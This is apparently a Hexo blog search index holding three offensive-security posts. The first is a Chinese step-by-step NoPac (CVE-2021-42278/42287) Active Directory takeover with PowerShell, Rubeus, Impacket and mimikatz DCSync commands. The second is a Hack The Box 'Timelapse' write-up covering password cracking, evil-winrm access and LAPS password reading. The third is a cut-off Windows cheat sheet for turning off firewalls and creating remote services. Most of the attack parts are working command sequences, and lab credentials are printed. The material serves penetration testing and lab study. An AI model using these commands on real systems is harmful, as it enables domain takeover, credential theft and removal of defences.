<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2021-42278 &amp; CVE-2021-42287 (NoPac)</title>
      <link href="/posts/f80a473a.html"/>
      <url>/posts/f80a473a.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>CVE-2021-42278，机器用户应当是 <code>COMUPTER$</code> 的形式，但是实际并没有验证机器账号是否有 <code>$</code>。导致机器用户名可以被模拟冒用</p><p>CVE-2021-42287，使用 COMPUTER 的 TGT 通过另一个用户去请求 COMPUTER 自己的 ST 时，将 TGT 发送给 KDC 后，当 KDC 找不到 COMPUTER 时，KDC 会再次寻找 <code>computer$</code> 的 ST，从而获得了 <code>computer$</code> 的 ST。从而获得了 <code>computer$</code> 的权限</p><p>利用条件：需要对属性 <code>sAMAccountName</code> and <code>servicePrincipalName</code> 有<strong>写权限</strong></p><p>可以利用域内默认的 MAQ 特性，默认允许域账户创建 10 个机器账户，而创建者对于机器账户具有写权限</p><blockquote><p>查看 MAQ 是否有限制，查看 LDAP 中的 ms-ds-machineaccountquota 属性</p></blockquote><p>攻击流程：</p><ol><li><p>创建一个机器账户，这在之前的文章都有所提及，使用 impacket 的 <code>addcomputer.py</code> 或是 <code>powermad</code>。<code>addcomputer.py</code> 是利用 <code>SAMR 协议 </code> 创建机器账户，这个方法所创建的机器账户没有 SPN，所以可以不用清除</p></li><li><p>清除机器账户的 <code>servicePrincipalName</code> 属性</p></li><li><p>将机器账户的 <code>sAMAccountName</code>，更改为 DC 的机器账户名字，注意后缀不带$</p></li><li><p>为机器账户请求 TGT</p></li><li><p>将机器账户的 <code>sAMAccountName</code> 更改为其他名字，不与步骤 3 重复即可</p></li><li><p>通过 S4U2self 协议向 DC 请求 ST</p></li><li><p>DCsync</p></li></ol><p>示例</p><p>假如域内有一台域控名为 DC（域控对应的机器用户为 <code>DC$</code>），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户 <code>SAMTHEADMIN-48$</code>，再把机器用户 <code>SAMTHEADMIN-48$</code> 的 <code>sAMAccountName</code> 改成 <code>DC</code></p><p>然后利用 <code>DC</code> 去申请一个 TGT 票据。再把 <code>DC</code> 的 <code>sAMAccountName</code> 改为 <code>SAMTHEADMIN-48$</code>。这个时候 KDC 就会判断域内没有 <code>DC</code> 这个用户，自动去搜索 <code>DC$</code>（<code>DC$</code> 是域内已经的域控 DC 的 <code>sAMAccountName</code>），攻击者利用刚刚申请的 TGT 进行 S4U2self，模拟域内的域管去请求域控 DC 的 ST 票据，最终获得域控制器 DC 的权限</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="检测漏洞是否存在"><a href="#检测漏洞是否存在" class="headerlink" title="检测漏洞是否存在"></a>检测漏洞是否存在</h2><p>这里利用 <a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a> 中的 scaner.py 来检测</p><p>![Pasted image 20220910171113.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910171113.png)</p><p>可以看到可以请求不包含 PAC 的 TGT，所以该域控可以被攻击</p><h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><p>这里使用 了 <code>powermad</code> 和 <code>PowerView</code> 脚本</p><p>创建机器账户</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$password</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">'1qaz2wsx'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token function">New-MachineAccount</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Password $<span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">-</span>Domain <span class="token string">"merak.local"</span> <span class="token operator">-</span>DomainController <span class="token string">"DC.merak.local"</span> <span class="token operator">-</span>Verbose</code></pre><p>![Pasted image 20220910175306.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910175306.png)</p><p>清除新建机器账户的 SPN</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-DomainObject</span> <span class="token string">"CN=NewEvilMachine,CN=Computers,DC=merak,DC=local"</span> <span class="token operator">-</span>Clear <span class="token string">'serviceprincipalname'</span> <span class="token operator">-</span>Verbose</code></pre><p>![Pasted image 20220910202352.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910202352.png)</p><p>修改机器账户的用户名为域控的用户名，注意不带 <code>$</code></p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-MachineAccountAttribute</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Value <span class="token string">"DC"</span> <span class="token operator">-</span>Attribute samaccountname <span class="token operator">-</span>Verbose</code></pre><p>![Pasted image 20220910203110.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910203110.png)</p><p>请求 TGT</p><pre class="language-bashDC" data-language="bashDC"><code class="language-bashDC">Rubeus.exe asktgt &#x2F;user:&quot;DC&quot; &#x2F;password:&quot;1qaz2wsx&quot; &#x2F;domain:&quot;merak.local&quot; &#x2F;dc:&quot;DC.merak.local&quot; &#x2F;nowrap</code></pre><p>![Pasted image 20220910210604.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910210604.png)</p><p>恢复机器账户原用户名</p><pre class="language-powershwll" data-language="powershwll"><code class="language-powershwll">Set-MachineAccountAttribute -MachineAccount &quot;NewEvilMachine&quot; -Value &quot;NewEvilMachine&quot; -Attribute samaccountname -Verbose</code></pre><p>![Pasted image 20220910212231.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910212231.png)</p><p>使用请求的 TGT 通过 S4U2self 获取 ST</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>self <span class="token operator">/</span>impersonateuser:<span class="token string">"administrator"</span> <span class="token operator">/</span>altservice:<span class="token string">"ldap/DC.merak.local"</span> <span class="token operator">/</span>dc:<span class="token string">"DC.merak.local"</span> <span class="token operator">/</span>ptt <span class="token operator">/</span>ticket:<span class="token namespace">[Base64 TGT]</span></code></pre><p>![Pasted image 20220910212825.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910212825.png)</p><p>验证</p><p>![Pasted image 20220910213055.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910213055.png)</p><p>DCSync</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:merak.local /kdc:DC.merak.local /user:krbtgt"</span> <span class="token string">"exit"</span></code></pre><p>![Pasted image 20220910213342.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910213342.png)</p><h2 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h2><p>创建机器账户</p><pre class="language-bash" data-language="bash"><code class="language-bash">python addcomputer.py -dc-ip <span class="token number">10.0</span>.100.10 -computer-name <span class="token string">'ImpacketEvilMachine$'</span> -computer-pass <span class="token string">'1qaz2wsx'</span> -dc-host DC -domain-netbios DC <span class="token string">'merak.local/xzz:Password123'</span></code></pre><p>![Pasted image 20220910214341.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910214341.png)</p><p>清除 SPN</p><p>addspn.py 出自 <a href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python addspn.py -u <span class="token string">'merak\xzz'</span> -p <span class="token string">'Password123'</span> -t <span class="token string">'ImpacketEvilMachine$'</span> -c DC.merak.local</code></pre><p>![Pasted image 20220910215313.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910215313.png)</p><p>修改机器账户用户名</p><p><a href="https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py">https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'ImpacketEvilMachine$'</span> -new-name <span class="token string">'DC'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre><p>![Pasted image 20220910220735.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910220735.png)</p><p>请求 TGT</p><pre class="language-bash" data-language="bash"><code class="language-bash">python getTGT.py -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC:1qaz2wsx'</span></code></pre><p>![Pasted image 20220910223444.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910223444.png)</p><p>恢复机器账户用户名</p><pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'DC'</span> -new-name <span class="token string">'ImpacketEvilMachine$'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre><p>![Pasted image 20220910221237.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910221237.png)</p><p>使用请求的 TGT 通过 S4U2self 获取 ST</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span><span class="token string">'DC.ccache'</span>python getST.py -impersonate <span class="token string">'administrator'</span> -spn <span class="token string">'cifs/DC.merak.local'</span> -k -no-pass -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC'</span></code></pre><p>失败，原因暂未可知</p><p>![Pasted image 20220911110934.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220911110934.png)</p><p>附一个成功的截图</p><p>![Pasted image 20220911111232.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220911111232.png)</p><h2 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h2><p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python noPac.py merak.local/zs:<span class="token string">'Password123'</span> -dc-ip DC.merak.local -shell --impersonate administrator </code></pre><p>![Pasted image 20220910230856.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910230856.png)</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tttang.com/archive/1380">https://tttang.com/archive/1380</a></p><p><a href="https://xz.aliyun.com/t/10666">https://xz.aliyun.com/t/10666</a></p><p><a href="https://xz.aliyun.com/t/10694">https://xz.aliyun.com/t/10694</a></p><p><a href="https://github.com/SecureAuthCorp/impacket/pull/1224">https://github.com/SecureAuthCorp/impacket/pull/1224</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Timelapse</title>
      <link href="/posts/628d110.html"/>
      <url>/posts/628d110.html</url>
      
        <content type="html"><![CDATA[<h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>There is no Chinese input method in kali, please forgive my English level</p><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre class="language-none"><code class="language-none">┌──(root💀kali)-[~]    └─# nmap -sC -sV -T4 10.10.11.152                                                                                                                        1 ⚙Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-08 16:17 CSTNmap scan report for 10.10.11.152Host is up (0.58s latency).Not shown: 989 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53&#x2F;tcp   open  domain        Simple DNS Plus88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-08 16:19:48Z)135&#x2F;tcp  open  msrpc         Microsoft Windows RPC139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445&#x2F;tcp  open  microsoft-ds?464&#x2F;tcp  open  kpasswd5?593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636&#x2F;tcp  open  tcpwrapped3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269&#x2F;tcp open  tcpwrappedService Info: Host: DC01; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsHost script results:|_clock-skew: 8h01m34s| smb2-security-mode: |   3.1.1: |_    Message signing enabled and required| smb2-time: |   date: 2022-04-08T16:20:31|_  start_date: N&#x2F;AService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 135.90 seconds</code></pre><p>Add domain <code>timelapse.htb</code> to <code>etc/hosts</code></p><h2 id="Out-of-domain-username-enumeration"><a href="#Out-of-domain-username-enumeration" class="headerlink" title="Out-of-domain username enumeration"></a>Out-of-domain username enumeration</h2><pre class="language-none"><code class="language-none">┌──(root💀kali)-[&#x2F;opt&#x2F;tools&#x2F;domain_tools]└─# .&#x2F;kerbrute userenum -d timelapse.htb &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;top-usernames-shortlist.txt --dc 10.10.11.152                                     1 ⚙    __             __               __        &#x2F; &#x2F;_____  _____&#x2F; &#x2F;_  _______  __&#x2F; &#x2F;____   &#x2F; &#x2F;&#x2F;_&#x2F; _ \&#x2F; ___&#x2F; __ \&#x2F; ___&#x2F; &#x2F; &#x2F; &#x2F; __&#x2F; _ \ &#x2F; ,&lt; &#x2F;  __&#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F;  __&#x2F;&#x2F;_&#x2F;|_|\___&#x2F;_&#x2F;  &#x2F;_.___&#x2F;_&#x2F;   \__,_&#x2F;\__&#x2F;\___&#x2F;                                        Version: v1.0.3 (9dad6e1) - 04&#x2F;08&#x2F;22 - Ronnie Flathers @ropnop2022&#x2F;04&#x2F;08 16:50:09 &gt;  Using KDC(s):2022&#x2F;04&#x2F;08 16:50:09 &gt;   10.10.11.152:882022&#x2F;04&#x2F;08 16:50:10 &gt;  [+] VALID USERNAME:       guest@timelapse.htb2022&#x2F;04&#x2F;08 16:50:10 &gt;  [+] VALID USERNAME:       administrator@timelapse.htb2022&#x2F;04&#x2F;08 16:50:11 &gt;  Done! Tested 17 usernames (2 valid) in 1.377 seconds</code></pre><h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><pre class="language-none"><code class="language-none">┌──(kali㉿kali)-[~]└─$ smbmap -H 10.10.11.152 -u guest[+] IP: 10.10.11.152:445        Name: timelapse.htb                                             Disk                                                    Permissions     Comment        ----                                                    -----------     -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    READ ONLY       Remote IPC        NETLOGON                                                NO ACCESS       Logon server share         Shares                                                  READ ONLY        SYSVOL                                                  NO ACCESS       Logon server share</code></pre><p>using the smbmap can found <code>Shares</code> have read privilege</p><p>try to login with guest by smbclient, there have a backup zip file</p><pre class="language-none"><code class="language-none">┌──(root💀kali)-[&#x2F;opt&#x2F;tools&#x2F;domain_tools]└─# smbclient -U guest -W timelapse.htb &#x2F;&#x2F;timelapse.htb&#x2F;Shares                                                                                     130 ⨯ 1 ⚙Enter TIMELAPSE.HTB\guest&#39;s password: Try &quot;help&quot; to get a list of possible commands.smb: \&gt; ls  .                                   D        0  Mon Oct 25 23:39:15 2021  ..                                  D        0  Mon Oct 25 23:39:15 2021  Dev                                 D        0  Tue Oct 26 03:40:06 2021  HelpDesk                            D        0  Mon Oct 25 23:48:42 2021                6367231 blocks of size 4096. 1382234 blocks availablesmb: \&gt; cd devsmb: \dev\&gt; ls  .                                   D        0  Tue Oct 26 03:40:06 2021  ..                                  D        0  Tue Oct 26 03:40:06 2021  winrm_backup.zip                    A     2611  Mon Oct 25 23:46:42 2021                6367231 blocks of size 4096. 1382218 blocks available</code></pre><p>get it!</p><h2 id="Brute-password"><a href="#Brute-password" class="headerlink" title="Brute password"></a>Brute password</h2><p>unzip the backup file need password</p><p>so, I should find the password at first</p><pre class="language-none"><code class="language-none">┌──(kali㉿kali)-[~]└─$ zip2john winrm_backup.zip &gt; hash.txt                   ┌──(kali㉿kali)-[~]└─$ john hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (PKZIP [32&#x2F;64])Will run 4 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statussupremelegacy    (winrm_backup.zip&#x2F;legacyy_dev_auth.pfx)     1g 0:00:00:00 DONE (2022-04-08 17:54) 3.846g&#x2F;s 13359Kp&#x2F;s 13359Kc&#x2F;s 13359KC&#x2F;s surki..superkeep16Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed</code></pre><p>get password <code>supremelegacy</code></p><p>unzip the to get <code>legacyy_dev_auth.pfx</code> file. This file also should password to open, using john too</p><pre class="language-none"><code class="language-none">python pfx2john.py ~&#x2F;legacyy_dev_auth.pfx &gt; ~&#x2F;pfx_hash.txtjohn pfx_hash.txt --format&#x3D;pfx --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</code></pre><p>get password: <code>thuglegacy</code></p><p>unlock the pfx file, I found a file named <code>Legacyy</code> in it, and the name is a vaild username in kerberos</p><pre class="language-none"><code class="language-none">    __             __               __        &#x2F; &#x2F;_____  _____&#x2F; &#x2F;_  _______  __&#x2F; &#x2F;____   &#x2F; &#x2F;&#x2F;_&#x2F; _ \&#x2F; ___&#x2F; __ \&#x2F; ___&#x2F; &#x2F; &#x2F; &#x2F; __&#x2F; _ \ &#x2F; ,&lt; &#x2F;  __&#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F;  __&#x2F;&#x2F;_&#x2F;|_|\___&#x2F;_&#x2F;  &#x2F;_.___&#x2F;_&#x2F;   \__,_&#x2F;\__&#x2F;\___&#x2F;                                        Version: v1.0.3 (9dad6e1) - 04&#x2F;08&#x2F;22 - Ronnie Flathers @ropnop2022&#x2F;04&#x2F;08 18:49:18 &gt;  Using KDC(s):2022&#x2F;04&#x2F;08 18:49:18 &gt;   10.10.11.152:882022&#x2F;04&#x2F;08 18:49:18 &gt;  [+] VALID USERNAME:       Legacyy@timelapse.htb2022&#x2F;04&#x2F;08 18:49:18 &gt;  Done! Tested 1 usernames (1 valid) in 0.320 seconds</code></pre><h1 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h1><p>I try to brute legacyy’s password by kerbrute, but fail</p><p>so, let back to where we started. We found a backup file, which name is <code>winrm_backup.zip</code>. Unzip the compressed file, We get the <code>legacyy_dev_auth.pfx</code></p><p>Maybe the winrm is a component or service in windows. I try to search it in google and I get the explain by Microsoft.</p><blockquote><p>Windows Remote Management (WinRM) is the Microsoft implementation of WS-Management Protocol, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.</p></blockquote><p>I consider the winrm is similar to SSH. So the credentials are also required.</p><p>As we all know, the pfx file usually contains the X.509 certificate and private key, and the <code>legacyy_dev_auth.pfx</code> we haven’t use yet. So I think the pfx can be used for authentication in winrm. Let’s separate the private key and X.509 certficate from the pfx file.</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out Legacyy.pemopenssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out cert.key -nodes</code></pre><p>Now, the problem is how to connect windows by winrm in linux (kali). I found a tool named <code>evil-winrm</code> in <a href="https://github.com/Hackplayers/evil-winrm">github</a>, which can connect to remote computer by winrm and use certificates for Authentication. Installation is simple in kali: <code>sudo apt-get install evil-winrm</code></p><p>Let’s connect!</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ evil-winrm -i <span class="token number">10.10</span>.11.152 -S -c Legacyy.pem -k cert.key Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machineData: For <span class="token function">more</span> information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>legacyy<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>timelapse<span class="token punctuation">\</span>legacyy</code></pre><p>get user flag in <code>c:\users\legacyy\desktop\user.txt</code></p><h1 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h1><p>After a long and futile enumeration, Prompted by <code>pyp</code> in <a href="https://forum.hackthebox.com/t/official-timelapse-discussion/254385/4?u=k0to">forum</a> and this <a href="https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html">blog</a>, I found the powershell history file</p><pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>legacyy<span class="token punctuation">\</span>appdata<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>PowerShell<span class="token punctuation">\</span>PSReadLine<span class="token operator">></span> <span class="token builtin class-name">type</span> ConsoleHost_history.txt<span class="token function">whoami</span>ipconfig /all<span class="token function">netstat</span> -ano <span class="token operator">|</span>select-string LIST<span class="token variable">$so</span> <span class="token operator">=</span> New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<span class="token variable">$p</span> <span class="token operator">=</span> ConvertTo-SecureString <span class="token string">'E3R$Q62^12p7PLlC%KWaxuaV'</span> -AsPlainText -Force<span class="token variable">$c</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential <span class="token punctuation">(</span><span class="token string">'svc_deploy'</span>, <span class="token variable">$p</span><span class="token punctuation">)</span>invoke-command -computername localhost -credential <span class="token variable">$c</span> -port <span class="token number">5986</span> -usessl -SessionOption <span class="token variable">$so</span> -scriptblock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>get-aduser -filter * -properties *<span class="token builtin class-name">exit</span></code></pre><p>WOW, there have svc_deploy’s credentials. following the history commands, we can execute commands as svc_deploy user</p><pre class="language-none"><code class="language-none">GROUP INFORMATION-----------------Group Name                                  Type             SID                                          Attributes&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled groupBUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled groupBUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled groupBUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled groupTIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled groupAuthentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled groupMandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</code></pre><p>The svc_deploy user is a member of the<code>LAPS_Readers</code> group. After some googling, I found that <code>LAPS_Readers</code> group members can read the password of the administrator user</p><pre class="language-none"><code class="language-none">invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock &#123;Get-ADComputer -Identity dc01 -properties * | findstr ms-Mcs-AdmPwd&#125;</code></pre><p>I got the password of administrator!</p><pre class="language-none"><code class="language-none">ms-Mcs-AdmPwd                        : )Vls1+OD0%8WlDdJ6Q)G!4)-ms-Mcs-AdmPwdExpirationTime          : 132943373149524209</code></pre><p>Now, login as administrator!</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ evil-winrm -i <span class="token number">10.10</span>.11.152 -S -u administrator -p <span class="token string">')Vls1+OD0%8WlDdJ6Q)G!4)-'</span>                                                                       <span class="token number">130</span> ⨯Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machineData: For <span class="token function">more</span> information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>timelapse<span class="token punctuation">\</span>administrator</code></pre><p>Get root.txt in <code>c:\users\TRX\desktop\root.txt</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windwos 命令备忘录</title>
      <link href="/posts/cfde7db2.html"/>
      <url>/posts/cfde7db2.html</url>
      
        <content type="html"><![CDATA[<h1 id="netsh-关闭防火墙"><a href="#netsh-关闭防火墙" class="headerlink" title="netsh 关闭防火墙"></a>netsh 关闭防火墙</h1><pre class="language-none"><code class="language-none">netsh advfilewall set publicprofile state offnetsh advfirewall set allprofiles state off</code></pre><h1 id="netsh-端口转发"><a href="#netsh-端口转发" class="headerlink" title="netsh 端口转发"></a>netsh 端口转发</h1><pre class="language-none"><code class="language-none"># 开启转发netsh interface portproxy add v4tov4 listenaddress&#x3D;LOCAL_ADDRESS listenport&#x3D;LOCAL_PORT connectaddress&#x3D;DEST_ADDRESS connectport&#x3D;DEST_PORT# 查看存在的转发netsh interface portproxy show all# 删除指定规则netsh interface portproxy delete v4tov4 listenport&#x3D;LOCAL_PORT listenaddress&#x3D;LOCAL_ADDRESS</code></pre><h1 id="sc-创建服务"><a href="#sc-创建服务" class="headerlink" title="sc 创建服务"></a>sc 创建服务</h1><p>基本用法</p><pre class="language-none"><code class="language-none">sc create &lt;SERVICE_NAME&gt; binpath&#x3D; &quot;&lt;COMMEND&gt;&quot;sc description &lt;SERVICE_NAME&gt;   &quot;DESCRIPTION&quot; 设置服务的描述字符串 sc config &lt;SERVICE_NAME&gt;   start&#x3D; auto  设置这个服务为自动启动 net start &lt;SERVICE_NAME&gt;   启动服务</code></pre><p>可以通过 IPC 连接在远程主机上创建服务</p><pre class="language-none"><code class="language-none"># 关闭域控防火墙sc \\\\DC create wall binpath&#x3D; &quot;netsh 